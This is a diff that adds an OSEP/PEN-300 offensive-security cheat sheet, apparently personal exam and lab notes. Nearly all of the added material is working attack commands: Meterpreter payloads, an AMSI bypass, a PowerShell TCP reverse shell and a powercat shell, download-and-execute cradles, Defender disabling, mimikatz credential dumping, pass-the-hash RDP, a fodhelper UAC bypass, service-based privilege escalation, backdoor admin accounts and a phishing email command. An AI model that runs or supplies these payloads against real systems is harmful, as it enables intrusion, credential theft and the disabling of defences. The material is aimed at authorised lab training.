@@ -15,13 +15,199 @@ msfconsole -qx "use exploit/multi/handler;set payload windows/x64/meterpreter/re
 ```
 
 ```bash
-msfconsole -qx "use exploit/multi/handler;set payload windows/x64/meterpreter/reverse_https;set LHOST 192.168.49.52;set LPORT 53;set AutoRunScript post/windows/manage/migrate;run;"
+msfconsole -qx "use exploit/multi/handler;set payload windows/x64/meterpreter/reverse_https;set LHOST 192.168.x.y;set LPORT 53;set AutoRunScript post/windows/manage/migrate;run;"
 ```
 
 ```bash
 msfvenom -p windows/x64/meterpreter_reverse_https LHOST=192.168.119.120 LPORT=443 -f exe -o msfnonstaged.exe
 
 msfvenom -p windows/x64/meterpreter/reverse_https LHOST=192.168.119.120 LPORT=443 -f exe -o msfstaged.exe
+```
+
+# OSEP
+
+```bash
+msfconsole -qx "use exploit/multi/handler;set payload windows/x64/meterpreter/reverse_https;set LHOST 192.168.45.153;set LPORT 53;run;" 
+
+msfvenom -p windows/x64/meterpreter/reverse_https LHOST=192.168.45.153 LPORT=53 EXITFUNC=thread -f csharp -o data.txt
+
+python helper.py data.txt > enc.txt
+```
+
+```bat
+;(dir 2>&1 *`|echo CMD);&<# rem #>echo PowerShell
+```
+
+```bat
+powershell.exe (New-Object System.Net.WebClient).DownloadFile('http://192.168.45.153/hol.exe', 'C:\Users\Public\hol.exe')
+
+C:\Users\Public\hol.exe 192.168.45.153 enc.txt
+```
+
+```pwsh
+[System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()
+```
+
+```pwsh
+iwr -uri http://192.168.45.153/PrintSpoofer64.exe -Outfile C:\Users\Public\PrintSpoofer64.exe
+C:\Users\Public\PrintSpoofer64.exe -i -c powershell.exe
+```
+
+```pwsh
+Set-MpPreference -DisableRealtimeMonitoring $true
+cmd /c "C:\Program Files\Windows Defender\MpCmdRun.exe" -RemoveDefinitions -All
+```
+
+```pwsh
+$ProgressPreference = "SilentlyContinue"
+iwr -uri http://192.168.45.153/SharpHound.ps1 -Outfile C:\Users\Public\SharpHound.ps1
+Import-Module C:\Users\Public\SharpHound.ps1
+Invoke-BloodHound -CollectionMethod All -OutputDirectory C:\Users\Public\ -OutputPrefix "final"
+```
+
+```bash
+impacket-smbserver osep /home/kali/Quick -smb2support -user admin -password Password1234
+```
+
+```bat
+net use \\192.168.45.153 /user:admin Password1234
+cp final_20241204092914_BloodHound.zip \\192.168.45.153\osep\
+```
+
+Raw query to display
+- all computers identified by the collector
+- all user accounts on the domain
+- all active user sessions on machines
+
+```
+MATCH (m:Computer) RETURN m
+MATCH (m:User) RETURN m
+MATCH p = (c:Computer)-[:HasSession]->(m:User) RETURN p
+```
+
+```pwsh
+iwr -uri http://192.168.45.153/mimikatz.exe -Outfile C:\Users\Public\mimikatz.exe
+.\mimikatz.exe
+```
+
+```
+privilege::debug
+sekurlsa::logonpasswords
+```
+
+`run0.txt`
+
+```pwsh
+$a=[Ref].Assembly.GetTypes();Foreach($b in $a) {if ($b.Name -like "*iUtils") {$c=$b}};$d=$c.GetFields('NonPublic,Static');Foreach($e in $d) {if ($e.Name -like "*Context") {$f=$e}};$g=$f.GetValue($null);[IntPtr]$ptr=$g;[Int32[]]$buf = @(0);[System.Runtime.InteropServices.Marshal]::Copy($buf, 0, $ptr, 1)
+
+$client = New-Object System.Net.Sockets.TCPClient('192.168.119.120',443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
+```
+
+```pwsh
+$Text = 'iex((new-object system.net.webclient).downloadstring("http://192.168.45.153/run0.txt"))'                                                               
+$Bytes = [System.Text.Encoding]::Unicode.GetBytes($Text)                    
+$EncodedText = [Convert]::ToBase64String($Bytes)                            
+$EncodedText
+```
+
+```
+sekurlsa::pth /user:Administrator /domain:corp.com /ntlm:2892d26cdf84d7a70e2eb3b9f05c425e /run:"powershell -exec bypass -nop -w hidden -e <base64-encoded command>"
+```
+
+```pwsh
+iwr -uri http://192.168.45.153/PowerView.ps1 -Outfile C:\Users\Public\PowerView.ps1
+Import-Module C:\Users\Public\PowerView.ps1
+
+Get-NetComputer | select dnshostname | Resolve-IPAddress
+Get-NetComputer | select dnshostname,operatingsystem,operatingsystemversion
+Get-NetUser | select userprincipalname
+
+$UserPassword = ConvertTo-SecureString 'Password1234' -AsPlainText -Force
+Set-DomainUserPassword -Identity 'nina@final.com' -AccountPassword $UserPassword
+```
+
+```bash
+./chisel server --port 8181 --reverse
+```
+
+```pwsh
+iwr -uri http://192.168.45.153/chisel.exe -Outfile C:\Users\Public\chisel.exe
+C:\Users\Public\chisel.exe client 192.168.45.153:8181 R:socks
+
+chisel.exe client 192.168.45.185:8181 R:3306:127.0.0.1:3306
+```
+
+```bash
+proxychains -q xfreerdp /cert-ignore /bpp:8 /compression -themes -wallpaper /auto-reconnect /size:1900x880 /d:final.com /u:nina /p:Password1234 /v:172.16.147.183 /drive:PEN-300,/home/kali/OffSec/PEN-300
+```
+
+```pwsh
+$a=[Ref].Assembly.GetTypes();Foreach($b in $a) {if ($b.Name -like "*iUtils") {$c=$b}};$d=$c.GetFields('NonPublic,Static');Foreach($e in $d) {if ($e.Name -like "*Context") {$f=$e}};$g=$f.GetValue($null);[IntPtr]$ptr=$g;[Int32[]]$buf = @(0);[System.Runtime.InteropServices.Marshal]::Copy($buf, 0, $ptr, 1)
+
+iex((new-object system.net.webclient).downloadstring('http://192.168.45.153/PowerUp.ps1'))
+
+Invoke-AllChecks
+
+sc.exe config SNMPTRAP binpath= "net localgroup Administrators nina /add" obj= "LocalSystem"
+
+sc.exe qc SNMPTRAP
+
+sc.exe start SNMPTRAP
+```
+
+```bash
+systemd-resolve --status | grep "DNS Servers"
+```
+
+```pwsh
+net user admin Password1234 /add
+net localgroup administrators admin /add
+```
+
+```pwsh
+Set-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server' -name "fDenyTSConnections" -value 0
+Enable-NetFirewallRule -DisplayGroup "Remote Desktop"
+```
+
+```bat
+dir /s trojan.txt
+```
+
+```pwsh
+Get-ChildItem -Recurse | Select-String "password" -List | Select Path
+```
+
+```bash
+proxychains -q smtp-user-enum -M RCPT -U emails.txt -t 172.16.x.y
+proxychains -q sendEmail -f dev@corp.com -t maanger@corp.com -u “Report to Review” -m “Please review this report” -s 172.16.x.y -a Report.doc
+```
+
+```pwsh
+New-Item -Path HKCU:\Software\Classes\ms-settings\shell\open\command -Value "powershell -exec bypass -nop -w hidden -e aQBlAHgAKAAoAG4AZQB3AC0AbwBiAGoAZQBjAHQAIABzAHkAcwB0AGUAbQAuAG4AZQB0AC4AdwBlAGIAYwBsAGkAZQBuAHQAKQAuAGQAbwB3AG4AbABvAGEAZABzAHQAcgBpAG4AZwAoACIAaAB0AHQAcAA6AC8ALwAxADkAMgAuADEANgA4AC4ANAA5AC4ANwA3AC8AcgB1AG4ALgB0AHgAdAAiACkAKQA=" -Force
+
+New-ItemProperty -Path HKCU:\Software\Classes\ms-settings\shell\open\command -Name DelegateExecute -PropertyType String -Force
+
+C:\Windows\System32\fodhelper.exe
+```
+
+
+```pwsh
+import sys
+import base64
+
+payload = "IEX(New-Object System.Net.WebClient).DownloadString('http://192.168.x.y/powercat.ps1'); powercat -c 192.168.x.y -p 443 -e powershell"
+
+cmd = "powershell -exec bypass -nop -w hidden -e " + base64.b64encode(payload.encode('utf16')[2:]).decode()
+
+print(cmd)
+```
+
+```bash
+rlwrap nc -nvlp 443
+```
+
+```pwsh
+powershell -exec bypass -nop -w hidden -e <base64_encode>
 ```
 
 ## HTML Smuggling
@@ -5891,6 +6077,10 @@ xfreerdp RDP client, which is installed on a Kali system by default, supports re
 xfreerdp /u:admin /pth:2892D26CDF84D7A70E2EB3B9F05C425E /v:192.168.120.6 /cert-ignore
 ```
 
+```bash
+xfreerdp /cert-ignore /bpp:8 /compression -themes -wallpaper /auto-reconnect /size:1900x880 /d:final.com /u:adminWebSvc /pth:b0df1cb0819ca0b7d476d4c868175b94 /v:192.168.113.181 /drive:PEN-300,/home/kali/OffSec/PEN-300
+```
+
 ## Reverse RDP Proxying with Metasploit
 
 `multi/manage/autoroute` module allow us to configure a reverse tunnel through the Meterpreter session and use that with a SOCKS proxy.
@@ -7300,7 +7490,7 @@ SecurityIdentifier: <SecurityIdentifier>
 AceType: AccessAllowedObject
 ```
 
-=> The AD object identified by the <SecurityIdentifier> SID has ReadProperty access rights to the Offsec user. 
+=> The AD object identified by the <SecurityIdentifier> SID has ReadProperty access rights to the **Offsec** user. 
 
 ```pwsh
 ConvertFrom-SID <SecurityIdentifier>
@@ -7329,6 +7519,12 @@ Enumerate all domain users that our current account has GenericAll rights to.
 3. Filter on usernames that match our current user as set in the `$env:UserDomain` and `$env:Username` environment variables
 
 ```pwsh
+Get-DomainUser | Get-ObjectAcl -ResolveGUIDs | Foreach-Object {$_ | Add-Member -NotePropertyName Identity -NotePropertyValue (ConvertFrom-SID $_.SecurityIdentifier.value) -Force; $_} | Foreach-Object {if ($_.Identity -eq "UserDomain\Username") {$_}}
+
+Get-DomainGroup | Get-ObjectAcl -ResolveGUIDs | Foreach-Object {$_ | Add-Member -NotePropertyName Identity -NotePropertyValue (ConvertFrom-SID $_.SecurityIdentifier.value) -Force; $_} | Foreach-Object {if ($_.Identity -eq "UserDomain\Username") {$_}}
+```
+
+```pwsh
 Get-DomainUser | Get-ObjectAcl -ResolveGUIDs | Foreach-Object {$_ | Add-Member -NotePropertyName Identity -NotePropertyValue (ConvertFrom-SID $_.SecurityIdentifier.value) -Force; $_} | Foreach-Object {if ($_.Identity -eq $("$env:UserDomain\$env:Username")) {$_}}
 ```
 
@@ -7346,6 +7542,11 @@ Change the password of the account without knowledge of the old password
 
 ```pwsh
 net user testservice1 h4x /domain
+```
+
+```pwsh
+$UserPassword = ConvertTo-SecureString 'Password1234' -AsPlainText -Force
+Set-DomainUserPassword -Identity 'nina@final.com' -AccountPassword $UserPassword
 ```
 
 Once reset the password, either log in to a computer with the account or create a process in the context of that user to perform a pass-the-ticket attack.
@@ -7713,7 +7914,11 @@ E.g., A RBCD attack that leads to code execution on appsrv01.
 
 ```pwsh
 Get-DomainComputer | Get-ObjectAcl -ResolveGUIDs | Foreach-Object {$_ | Add-Member -NotePropertyName Identity -NotePropertyValue (ConvertFrom-SID $_.SecurityIdentifier.value) -Force; $_} | Where-Object { $_.ActiveDirectoryRights -like '*GenericWrite*' }
+
+Get-DomainComputer | Get-ObjectAcl -ResolveGUIDs | Foreach-Object {$_ | Add-Member -NotePropertyName Identity -NotePropertyValue (ConvertFrom-SID $_.SecurityIdentifier.value) -Force; $_} | Foreach-Object {if ($_.Identity -eq "UserDomain\Username") {$_}}
 ```
+
+Note: We can also use this attack vector with **GenericAll**, **WriteProperty**, or **WriteDACL** access rights.
 
 Starts by compromising a domain account that has the **GenericWrite** access right on a computer account object (user dave)
 
